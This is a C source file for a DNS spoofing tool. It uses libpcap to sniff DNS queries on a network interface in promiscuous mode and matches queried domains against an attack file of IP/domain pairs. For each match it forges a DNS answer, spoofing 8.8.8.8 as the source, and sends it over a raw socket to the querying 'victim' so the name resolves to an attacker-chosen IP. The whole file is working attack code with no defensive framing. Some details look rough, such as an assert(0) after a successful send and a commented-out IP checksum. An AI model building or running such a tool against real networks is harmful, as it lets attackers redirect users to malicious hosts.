#include <stdio.h>
#include <pcap.h>
#include <getopt.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <assert.h>
#include <errno.h>

int	packet_count = 0;

// structure definition at https://www.winpcap.org/docs/docs_40_2/html/group__wpcap__tut6.html
/* 4 bytes IP address */
typedef struct ip_address{
    u_char byte1;
    u_char byte2;
    u_char byte3;
    u_char byte4;
}ip_address;

/* IPv4 header */
typedef struct  __attribute__((packed, aligned(1))) ip_header{
    u_char  ver_ihl;        // Version (4 bits) + Internet header length (4 bits)
    u_char  tos;            // Type of service 
    u_short tlen;           // Total length 
    u_short identification; // Identification
    u_short flags_fo;       // Flags (3 bits) + Fragment offset (13 bits)
    u_char  ttl;            // Time to live
    u_char  proto;          // Protocol
    u_short crc;            // Header checksum
    ip_address  saddr;      // Source address
    ip_address  daddr;      // Destination address
    u_int   op_pad;         // Option + Padding
}ip_header;

/* IPv4 header */
typedef struct  __attribute__((packed, aligned(1))) iphead {
    	uint8_t		ver_ihl;        
    	uint8_t		tos;            
    	uint16_t	tlen;           
    	uint16_t	identification; 
    	uint16_t	flags_fo;       
    	uint8_t		ttl;            
    	uint8_t		proto;          
    	uint16_t	crc;            
    	uint32_t	saddr;      
    	uint32_t	daddr;      
}iphead;

/* UDP header*/
typedef struct __attribute__((packed, aligned(1))) udp_header{
    	uint16_t	sport;          // Source port
    	uint16_t	dport;          // Destination port
    	uint16_t	len;            // Datagram length
    	uint16_t	crc;            // Checksum
}udp_header;

typedef struct __attribute__((packed, aligned(1))) dns_header {
	uint16_t	id;
	uint16_t        flags;
	uint16_t        questions;
	uint16_t        answer;
	uint16_t        nscount;
	uint16_t        arcount;
} dns_header;

typedef struct __attribute__((packed, aligned(1))) dns_question {
	uint16_t	qtype;
	uint16_t	qclass;
} dns_question;

typedef struct __attribute__((packed, aligned(1))) dns_response {
	uint16_t	name;
	uint16_t	type;
	uint16_t	class;
	uint32_t	ttl;
	uint16_t	len;
	uint32_t	ip;
} dns_response;

typedef struct __attribute__((packed, aligned(1))) chksum_hdr {
	uint32_t	src_ip;
	uint32_t	dst_ip;
	uint8_t		reserved;
	uint8_t		protocol;
	uint16_t	len;	
} chksum_hdr;

void
print_payload( u_char	*ptr,
	       int	len) {
	int	i, count, j;
	char	temp[20] = {0};	

        count = 0;
        for (i = 0; i < len;) {
        	temp[count++] = ptr[i];
                printf(" %02x ", ptr[i++]);
                if (i%15 == 0 || i >= len) {
         		printf("\t\t");
			for (j = 0; j < 15; j++) {
				if (isprint(temp[j]))
					printf("%c", temp[j]);
				else
					printf(".");
			}
                	printf("\n");
                	count = 0;
                }
       	}
        printf("\n");

}

/*
    Generic checksum calculation function
*/
unsigned short csum(unsigned short *ptr,int nbytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;
 
	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}
 
	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;

	return(answer);
}

int
send_spoofed_dns_response(u_char	*dns_req,
			  char		*target_ip,
			  int		len,
			  uint32_t	*dest_ip,
			  uint16_t	dest_port) {

	u_char			dns_res[1000]; 
	struct iphead 		*iph = NULL;
	dns_response		*spoofed_response = NULL;
	dns_header		*head = NULL;
	udp_header		*udp = NULL;
	int			soc = 0, status = -1, ip_len = 0;
	struct sockaddr_in 	victim_addr;
	char			temp[INET_ADDRSTRLEN];
	struct chksum_hdr	hdr;
	char			check_sum[1000];

	// ==========
	iph = (struct iphead *)dns_res;
    	iph->ver_ihl = 45;
    	iph->tos = 0;
	ip_len = (iph->ver_ihl & 0xf)*4; 
    	iph->tlen = htons(ip_len + 8 + len + sizeof(dns_response)); 
    	iph->identification = htons(1111);
    	iph->flags_fo = htons(16384);       
    	iph->ttl = 255;            
    	iph->proto = 17;          
    	iph->crc = 0;            
    	iph->saddr = inet_addr("8.8.8.8");      
    	iph->daddr = *dest_ip;
	//iph->crc = csum((unsigned short *)dns_res, iph->tlen); 
	// ==========
	
	memcpy(dns_res + ip_len + 8, dns_req, len);

	head = (struct dns_header *)(dns_res + ip_len + 8);
	head->answer = htons(0x1);
	head->flags = htons(0x8180);

	spoofed_response = (struct dns_response *)(dns_res + ip_len + len + 8);
	spoofed_response->name = htons(0xc00c);
	spoofed_response->type = htons(0x1);
	spoofed_response->class = htons(0x1);
	spoofed_response->ttl = htonl(4);
	spoofed_response->len = htons(4);
	inet_pton(AF_INET, target_ip, &(spoofed_response->ip));

	printf("\nOriginal message:\n");
	print_payload(dns_req, len);
	printf("\nSpoofed DNS response:\n");
	print_payload(dns_res + ip_len + 8, len + sizeof(dns_response));
	// ========

	soc = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
	if (soc < 0) {
		printf("\nUnable to create UDP raw socket = %d\n", soc);
		return -1;
	}

	int one = 1;
    	const int *val = &one;
	status = setsockopt (soc, IPPROTO_IP, IP_HDRINCL, val, sizeof (one));
	if (status < 0) {
		printf("unable to set socket option of IP_HDRINCL !\n");
		assert(0);
	}
	// ========

	udp = (struct udp_header *)(dns_res + ip_len);
	udp->sport = htons(53);
	udp->dport = dest_port;
	udp->len = htons(len + sizeof(dns_response) + 8);
	udp->crc = 0;

        printf("\nTotal DNS response:\n");
        print_payload(dns_res, len + sizeof(dns_response) + 8 + ip_len);
	// =========
		
	bzero((char *) &victim_addr, sizeof(victim_addr));
    	victim_addr.sin_family = AF_INET;
    	victim_addr.sin_port = dest_port;
	victim_addr.sin_addr.s_addr = *dest_ip;

	inet_ntop(AF_INET, &(victim_addr.sin_addr), temp, INET_ADDRSTRLEN);
	printf("\nVictim IP address = %s\t", temp);
	printf("Port = %d\n", ntohs(victim_addr.sin_port));

	status = sendto(soc, dns_res, len + sizeof(dns_response) + 8, 0, 
			(struct sockaddr *)&victim_addr, sizeof(victim_addr));
	if (status < 0) {
		printf("\nUnable to send packet to victim %d !\n", errno);
		assert(0);
	}

	printf("\nSent spoofed response successfully !\n");
	// ========

	close(soc);
	assert(0);
	return 0;

}

int
check_attack_target(char	*domain_name,
		    char	*attack_filename,
		    char	*target_ip) {

	FILE		*file;
	char		entry[101];
	char		*ptr = NULL;
	int		i = 0;
	int		ret = 0, status = -1;

	file = fopen(attack_filename, "r");
	if (file == NULL) {
		printf("\nattack file not present, please provide complete path for attack file\n");
		return -1; 
	}

	while(1) {	
        	ptr = fgets(entry, 101, file);
        	if (ptr == NULL)
			break;

		i = 0;
		while(!isspace(entry[i])) {
			target_ip[i] = entry[i];
			i++;
		}
		target_ip[i] = '\0';
		
		while(isspace(entry[i]))
			i++;

		status = strncmp(entry + i, domain_name, strlen(domain_name));
		if (status == 0) {
			return 1;
		}
	}
	return ret;	
}

void
process_packet(	u_char 				*attack_filename,
		const struct pcap_pkthdr 	*header,
		const u_char 			*p) {
	u_char			*packet = (u_char *)p;
	struct ether_header 	*arp_hdr = (struct ether_header *)p;
	int			i = 0, j = 0, status = -1;
	int			ip_header_len = 0;
	ip_header		*p_hdr = NULL;
	udp_header		*udp = NULL;
	dns_header		*dns = NULL;
	u_char			domain_name[101], *ptr = NULL;
	dns_question		*quest = NULL;
	char			target_ip[101];

	if (ntohs(arp_hdr->ether_type) != ETHERTYPE_IP) {
		return;
	}

	// IP packet 
	p_hdr = (ip_header *)(packet + 14);
        if (p_hdr->proto != 17) 
                return;

	// UDP packet
        ip_header_len = (p_hdr->ver_ihl & 0xf)*4;
	udp = (struct udp_header *)(packet + 14 + ip_header_len);

	// DNS port
	if (ntohs(udp->dport) != 53)
		return;

        packet_count++;
        printf("\n%dth packet: ", packet_count);

        printf("\nSource IP Address:");
        printf(" %d.%d.%d.%d ", p_hdr->saddr.byte1, p_hdr->saddr.byte2, p_hdr->saddr.byte3, p_hdr->saddr.byte4);
        printf("\tDestination IP Address:");
        printf(" %d.%d.%d.%d ", p_hdr->daddr.byte1, p_hdr->daddr.byte2, p_hdr->daddr.byte3, p_hdr->daddr.byte4);

        printf("\nUDP packet ");
        printf("\tSource Port: %d ", ntohs(udp->sport));
        printf("\tDestn Port: %d", ntohs(udp->dport));
        printf("\tUDP Length = %lu", (size_t)header->len - (14 + ip_header_len + 8));


	printf("\n============");
	printf("\nUDP PAYLOAD:");
	printf("\n============\n");
	print_payload(packet + 14 + ip_header_len + 8, header->len - (14 + ip_header_len + 8));

	dns = (struct dns_header *)(packet + 14 + ip_header_len + 8);
	printf("\nDNS ID = %d\n", ntohs(dns->id));
	printf("\nDNS flags = %d\n", ntohs(dns->flags));
	printf("\nNumber of DNS questions = %d\n", ntohs(dns->questions));

	ptr = (u_char *)(packet + 14 + ip_header_len + 8 + 12);
	for (i = 0, j = 0; i < ntohs(dns->questions); i++) {
		while(*ptr) {
			strncpy(domain_name + j, ptr + 1, *ptr);
			j = j + *ptr;
			domain_name[j++] = '.';
			ptr = ptr + *ptr + 1;
		}
		domain_name[j - 1] = '\0';
		ptr = ptr + 1;
		printf("\nDomain name = %s\n", domain_name);
                quest = (struct dns_question *)ptr;
                printf("\nQuestion qtype = %d\n", ntohs(quest->qtype));
                printf("\nQuestion qclass = %d\n", ntohs(quest->qclass));
		ptr = ptr + 4;

		status = 0;
		status = check_attack_target(domain_name, attack_filename, target_ip);
		if (status == 0)
			continue;

		printf("\ntarget IP = %s\n", target_ip);

		status = send_spoofed_dns_response(packet + (14 + ip_header_len + 8),
						   target_ip, 
						   header->len - (14 + ip_header_len + 8),
						   (uint32_t *)(packet + 14 + 12),
						   udp->sport);
		if (status != 0) {
			printf("\nUnable to send spoofed DNS response to target !\n");
		}
	}
	printf("\n=======================================================================\n");
}

void
sniff_packet(char        *interface,
             char  	 *filter_string,
   	     char	 *attack_filename) {
	char 			errbuf[PCAP_ERRBUF_SIZE];
	int			result = 0;
	bpf_u_int32 		mask;		
	bpf_u_int32 		net;		
	pcap_t 			*live_device = NULL;
	struct bpf_program 	fp;	

        live_device = pcap_open_live(interface, BUFSIZ, 1, 0, errbuf);
        if (live_device == NULL) {
        	printf("\nFailed to open interface in PROMISCIOUS mode: %s\n", errbuf);
		return;
        }

	if(filter_string != NULL) {
		result = pcap_lookupnet(interface, &net, &mask, errbuf);	
		if (result == -1) {
			printf("\nFailed to get netmask of the device !!!\nPlease configure the IP of the interface properly before sniffing\n");
			return;
		}

		result = pcap_compile(live_device, &fp, filter_string, 0, net);
                if (result == -1) {
                        printf("\nFailed to compile filter for device : %s\nThis syntax of BPF filter is not supported\n", pcap_geterr(live_device));
                        return;
                }

		result = pcap_setfilter(live_device, &fp);
		if (result == -1) {
			printf("\nFailed to set device filter !!!\n");
			return;
		}
	}

	result = pcap_loop(live_device, 0, process_packet, attack_filename);
	if (result < 0) {
		printf("\nEn-expected error occurred in live packet capture !!!\n");
	}		
}

int main(int argc, char **argv) {
	char 	errbuf[PCAP_ERRBUF_SIZE], option;
	int	count = 0;
	char	*interface = NULL;
	char	*attack_filename = NULL;
	char	bpf_filter[50] = {0};
	int	index = -1;	

	while ((option = getopt(argc, argv, "i:f:")) != -1) {
		switch(option) {
			case 'i':
				interface = optarg;
				printf("\nSniffing on interface: %s\n", interface);
			break;
			case 'f':
				attack_filename = optarg;
				printf("\nReading from attack file: %s\n", attack_filename);
				if( access(attack_filename, F_OK) == -1 ) {
					printf("\nAttack file %s not present !\n", attack_filename);
					return 0;
				}
			break;
			case '?':
				printf("\nUn-supported option passed !!!\n");
			break;
			case ':':
				printf("\nArgument missing !!!\n");
			break;
		}
		count++;
	}

	if (2*count+1 < argc) {
                index = 2*count + 1;
                while(1) {
                	if (argv[index] == NULL || strstr((const char *)argv[index], "-"))
                        	break;
                        strcat(bpf_filter, (const char *)argv[index]);
                        strcat(bpf_filter, " ");
                        index++;    
            	}
		printf("\nSetting BPF filter: %s\n", bpf_filter);
	}
	
	if (interface == NULL) {
        	interface = pcap_lookupdev(errbuf);
        	if (interface == NULL) {
        		printf("\nCould not find default sniffing device !!!\n");
        		return 0;
        	}
        	printf("\nSniffing on default device: %s\n", interface);
	}

	sniff_packet(interface, bpf_filter, attack_filename);

	return 0;
}
